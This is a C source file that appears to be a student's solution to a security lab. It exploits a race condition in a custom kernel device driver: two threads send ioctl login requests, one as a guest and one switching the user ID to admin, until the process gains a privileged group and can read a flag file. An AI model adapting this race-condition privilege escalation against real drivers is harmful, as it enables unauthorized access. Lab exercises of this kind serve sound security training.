//gcc -o 3.bin  3.c
#include <stdio.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <unistd.h> // for chdir
#include <stdlib.h> // for system

#define DEVFILE		"lab73_login"

#define CMD_LOGIN       100

#define LAB73WIN_ID	    1032
#define USERID_GUEST	9999
#define PASSWD_GUEST	123456
#define USERID_ADMIN	1337
#define TARGET_FILE "/home/se/Documents/labs/lab7/attmpt1_7-3/flag.txt"
//#define TARGET_FILE "/home/lab7-3/flag.txt"
#define DESTINATION_FILE "flag_copy.txt"

pthread_t tAttacker, tUserLogin;
int fd;
int quit_threads = 0;


struct login_creds {
	long int userid;
	long int passwd;
};

struct login_creds login;



void PrintFlag() {
	printf("\n [*] %d\n", getegid());
	
	
    FILE *file = fopen(TARGET_FILE, "r");
    if (file != NULL) {
        char buffer[100];  // Buffer to store read content
        while (fgets(buffer, sizeof(buffer), file) != NULL) {
            printf("%s", buffer);  // Display each line to the console
        }
        fclose(file);
    } else {
        perror("Error opening file");
        
    }
	printf("\n [*] %d\n", getegid());
	return;
}



void *UserLogin(void *arg) {
    

    ioctl(fd, CMD_LOGIN, &login);
    printf("[*] UL: GID <%d>\n", getegid());		
    
    if (getegid() == LAB73WIN_ID){
        quit_threads = 1;
        
        printf("Group Privileges have been escalated to LAB73WIN_ID!\n");
        
//         printf("[//] UL: ATTEMPT PRINT%d\n", getegid());
//         PrintFlag();			
//         printf("[//] UL: SUCCESS close and exit\n");
        //pthread_cancel(tStatusCheck);
        
        printf("[//] UL: ATTEMPT PRINT%d\n", getegid());

        printf("\n [*] %d\n", getegid());
        
        
        FILE *file = fopen(TARGET_FILE, "r");
        if (file != NULL) {
            char buffer[100];  // Buffer to store read content
            while (fgets(buffer, sizeof(buffer), file) != NULL) {
                printf("%s", buffer);  // Display each line to the console
            }
            fclose(file);
        } else {
            perror("Error opening file");
            
        }
        printf("\n [*] %d\n", getegid());
        printf("[//] UL: SUCCESS close and exit\n");
        
        
        
        
    }
    
    pthread_exit(NULL);

}


void *Attacker(void *arg) {

// 	printf("[*] B4\n");
// 	usleep(50);
// 	printf("[*] A9\n");
	

    //usleep(5000);
    
    login.userid = USERID_ADMIN;

    ioctl(fd, 200, &login);
    printf("[*] AL: GID <%d>\n", getegid());		



	pthread_exit(NULL);

}

int main(int argc, char *argv[]) {
	    
	printf("[//] Fail Print Attempt\n");   //todo: delete me
	PrintFlag();
	
    while(!quit_threads){
        printf("[*] Open Device File\n");
        fd = open("/dev/"DEVFILE, O_RDWR);
        if (fd < 0) {
            perror("open");
            return 0;
        }
        login.userid = USERID_GUEST;
        login.passwd = PASSWD_GUEST;
        
        pthread_create(&tUserLogin, NULL, UserLogin, NULL);
        pthread_create(&tAttacker, NULL, Attacker, NULL);
        pthread_join(tAttacker, NULL);
        pthread_join(tUserLogin, NULL);
        
        printf("[*] OUT: GID <%d>\n", getegid());	        
        if (getegid() == LAB73WIN_ID){
            quit_threads = 1;
            printf("[*] UL: GID <%d>\n", getegid());		
            
            printf("Group Privileges have been escalated to LAB73WIN_ID!\n");
            
            printf("[//] UL: ATTEMPT PRINT\n");
            PrintFlag();			
            printf("[//] UL: SUCCESS close and exit\n");
            //pthread_cancel(tStatusCheck);
        
        }   
        
        close(fd);
	}
	
    pthread_exit(NULL);

	
//     pthread_create(&tUserLogin, NULL, UserLogin, NULL);
// 	pthread_create(&tAttacker, NULL, Attacker, NULL);
// 	pthread_create(&tStatusCheck, NULL, StatusCheck, NULL);
// 	pthread_join(tAttacker, NULL);
//     pthread_join(tUserLogin, NULL);
//     pthread_join(tStatusCheck, NULL);
// 	close(fd);
    
	printf("[][] Fin\n");
	return 0;

}
